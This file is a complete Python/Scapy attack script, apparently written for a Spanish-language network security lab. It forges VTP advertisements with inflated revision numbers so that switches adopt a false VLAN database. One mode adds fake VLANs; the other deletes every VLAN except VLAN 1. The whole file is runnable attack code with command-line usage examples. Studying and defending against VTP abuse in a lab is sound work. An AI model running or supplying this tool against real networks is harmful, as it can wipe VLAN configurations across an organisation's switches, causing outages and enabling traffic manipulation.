#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              ATAQUE VTP — Agregar y Borrar VLANs                ║
║              Seguridad de Redes — Laboratorio #7                ║
╚══════════════════════════════════════════════════════════════════╝

Descripción:
    Explota el protocolo VTP (VLAN Trunking Protocol) enviando
    mensajes VTP Summary Advertisement y Subset Advertisement
    falsos con número de revisión alto para:
    - Agregar VLANs falsas a toda la red
    - Borrar todas las VLANs existentes (más destructivo)

    VTP sincroniza la base de datos de VLANs entre switches.
    El switch con el número de revisión MÁS ALTO gana y todos
    los demás adoptan su base de datos de VLANs.

Requisitos:
    pip3 install scapy
    Ejecutar como root

Uso:
    # Agregar VLANs falsas
    sudo python3 vtp_attack.py -i ens3 --domain cisco --mode add --vlans 100,200,300

    # Borrar todas las VLANs (revisión alta + lista vacía)
    sudo python3 vtp_attack.py -i ens3 --domain cisco --mode delete
"""

import argparse
import os
import random
import struct
import sys
import time

try:
    from scapy.all import Ether, LLC, SNAP, sendp, conf, get_if_hwaddr
except ImportError:
    print("[!] Instalar Scapy: pip3 install scapy")
    sys.exit(1)

# ── Constantes VTP ────────────────────────────────────────────────
VTP_MULTICAST = "01:00:0c:cc:cc:cc"
LLC_DSAP      = 0xAA
LLC_SSAP      = 0xAA
LLC_CTRL      = 0x03
SNAP_OUI      = b'\x00\x00\x0c'
SNAP_PID      = 0x2003   # PID para VTP


def build_vtp_summary(domain, revision, updater_ip="1.2.3.4"):
    """
    Construye VTP Summary Advertisement.
    Este mensaje anuncia el dominio y el número de revisión.
    El switch que recibe este mensaje con revisión mayor
    solicita la base de datos completa de VLANs.
    """
    domain_bytes  = domain.encode()[:32].ljust(32, b'\x00')
    updater_bytes = bytes(int(x) for x in updater_ip.split('.'))
    timestamp     = b'\x00' * 12  # timestamp vacío

    payload = (
        b'\x01'              # VTP version 1
        b'\x01'              # Message type: Summary Advertisement
        b'\x05'              # Followers (número de Subset Adv que siguen)
        + len(domain_bytes).to_bytes(1, 'big')
        + domain_bytes
        + struct.pack('>I', revision)   # Configuration Revision (4 bytes)
        + updater_bytes                 # Updater Identity
        + timestamp                     # Update Timestamp
        + b'\x00' * 16                  # MD5 digest (vacío)
    )
    return payload


def build_vlan_entry(vlan_id, vlan_name=None):
    """
    Construye una entrada de VLAN para VTP Subset Advertisement.
    Cada entrada describe una VLAN: ID, nombre, estado, tipo.
    """
    if vlan_name is None:
        vlan_name = f"VLAN{vlan_id:04d}"

    name_bytes  = vlan_name.encode()[:32]
    name_len    = len(name_bytes)

    # Longitud total de la entrada
    entry_len = 12 + name_len

    entry = (
        entry_len.to_bytes(1, 'big')        # Info length
        + b'\x01'                            # Status: active
        + b'\x01'                            # VLAN type: Ethernet
        + name_len.to_bytes(1, 'big')        # Name length
        + vlan_id.to_bytes(2, 'big')         # VLAN ID
        + b'\x00\x64'                        # MTU: 100
        + b'\x00\x07\x00\x64'               # 802.10 index
        + name_bytes                         # VLAN name
    )
    return entry


def build_vtp_subset(domain, revision, vlans):
    """
    Construye VTP Subset Advertisement con la lista de VLANs.
    Este mensaje contiene la base de datos completa de VLANs
    que los switches adoptarán si la revisión es mayor.
    """
    domain_bytes = domain.encode()[:32].ljust(32, b'\x00')

    # Construir entradas de VLANs
    vlan_entries = b''
    for vlan_id in vlans:
        vlan_entries += build_vlan_entry(vlan_id)

    payload = (
        b'\x01'              # VTP version 1
        b'\x02'              # Message type: Subset Advertisement
        b'\x01'              # Sequence number
        + len(domain_bytes).to_bytes(1, 'big')
        + domain_bytes
        + struct.pack('>I', revision)
        + vlan_entries
    )
    return payload


def build_vtp_frame(src_mac, vtp_payload):
    """
    Construye el frame Ethernet completo con VTP.
    Estructura: Ethernet > LLC > SNAP > VTP
    """
    snap = SNAP_OUI + SNAP_PID.to_bytes(2, 'big') + vtp_payload
    llc  = bytes([LLC_DSAP, LLC_SSAP, LLC_CTRL]) + snap

    pkt = Ether(src=src_mac, dst=VTP_MULTICAST) / llc
    return pkt


def run_attack(iface, domain, mode, vlans, revision, count, delay):
    """Ejecuta el ataque VTP."""
    conf.verb = 0

    try:
        src_mac = get_if_hwaddr(iface)
    except Exception:
        src_mac = "aa:bb:cc:dd:ee:ff"

    # Número de revisión alto para ganar la elección
    if revision == 0:
        revision = random.randint(900000, 999999)

    print(f"""
╔══════════════════════════════════════════╗
║         VTP Attack — Iniciando           ║
╠══════════════════════════════════════════╣
║  Interfaz : {iface:<28} ║
║  Dominio  : {domain:<28} ║
║  Modo     : {mode:<28} ║
║  Revisión : {revision:<28} ║
║  VLANs    : {str(vlans):<28} ║
╚══════════════════════════════════════════╝
[!] Ctrl+C para detener
""")

    # En modo delete, lista de VLANs vacía (borra todo)
    if mode == 'delete':
        vlans = [1]  # Solo VLAN 1 (obligatoria), borra el resto
        print("[*] Modo DELETE: eliminando todas las VLANs excepto VLAN 1")
    else:
        print(f"[*] Modo ADD: agregando VLANs {vlans}")

    enviados = 0
    inicio   = time.time()

    try:
        while count == 0 or enviados < count:
            # 1. Enviar Summary Advertisement
            summary = build_vtp_summary(domain, revision)
            pkt_summary = build_vtp_frame(src_mac, summary)
            sendp(pkt_summary, iface=iface, verbose=0)

            time.sleep(0.1)

            # 2. Enviar Subset Advertisement con las VLANs
            subset = build_vtp_subset(domain, revision, vlans)
            pkt_subset = build_vtp_frame(src_mac, subset)
            sendp(pkt_subset, iface=iface, verbose=0)

            enviados += 1
            elapsed = time.time() - inicio
            print(f"\r[*] Enviados: {enviados} pares Summary+Subset | "
                  f"Revisión: {revision} | T: {elapsed:.0f}s",
                  end='', flush=True)

            revision += 1  # Incrementar revisión para cada envío
            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        print("\n\n[*] Ataque detenido.")

    print(f"\n[+] Total: {enviados} mensajes VTP enviados")
    print(f"[+] Revisión final: {revision}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Ataque VTP — Agrega o borra VLANs en la red"
    )
    parser.add_argument('-i', '--iface',    required=True, help='Interfaz de red')
    parser.add_argument('--domain',         default='cisco',
                        help='Nombre del dominio VTP (default: cisco)')
    parser.add_argument('--mode',           choices=['add', 'delete'], default='add',
                        help='add=agregar VLANs, delete=borrar VLANs (default: add)')
    parser.add_argument('--vlans',          default='100,200,300',
                        help='VLANs a agregar separadas por coma (default: 100,200,300)')
    parser.add_argument('--revision',       type=int, default=0,
                        help='Número de revisión inicial (0=aleatorio alto)')
    parser.add_argument('-c', '--count',    type=int, default=5,
                        help='Veces a enviar los mensajes (0=infinito, default: 5)')
    parser.add_argument('-d', '--delay',    type=float, default=1.0,
                        help='Delay entre envíos (default: 1.0)')
    return parser.parse_args()


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root")
        sys.exit(1)

    args  = parse_args()
    vlans = [int(v.strip()) for v in args.vlans.split(',')]

    run_attack(
        iface    = args.iface,
        domain   = args.domain,
        mode     = args.mode,
        vlans    = vlans,
        revision = args.revision,
        count    = args.count,
        delay    = args.delay
    )

